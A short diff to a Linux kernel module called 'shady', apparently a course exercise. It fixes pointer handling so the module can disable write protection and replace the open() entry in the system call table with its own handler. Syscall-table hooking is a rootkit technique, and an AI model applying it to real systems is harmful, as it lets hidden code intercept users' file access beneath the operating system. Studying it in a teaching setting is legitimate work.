@@ -53,7 +53,7 @@ static struct class *shady_class = NULL;
 
 /* ================================================================ */
 // MY CODE
-unsigned long* system_call_table_address = 0xffffffff81801400;
+unsigned long system_call_table_address = 0xffffffff81801400;
 int marks_uid = 0;
 
 void set_addr_rw (unsigned long addr) {
@@ -232,6 +232,7 @@ shady_cleanup_module(int devices_to_destroy)
 static int __init
 shady_init_module(void)
 {
+  void **sys_call_table;
   int err = 0;
   int i = 0;
   int devices_to_destroy = 0;
@@ -248,10 +249,13 @@ shady_init_module(void)
     // Turn off read write protections
     set_addr_rw(system_call_table_address);
     
+    // Convert sys_call_table_address to address pointer
+    sys_call_table = (void*)system_call_table_address;
+    
     // save old open position
     printk(KERN_DEBUG "TESTING %d\n", 1);  // sys_open should be 5?
-    old_open = system_call_table_address[__NR_open];
-    system_call_table_address[__NR_open] = my_open;
+    old_open = sys_call_table[__NR_open];
+    sys_call_table[__NR_open] = my_open;
     
 
   /* Get a range of minor numbers (starting with 0) to work with */
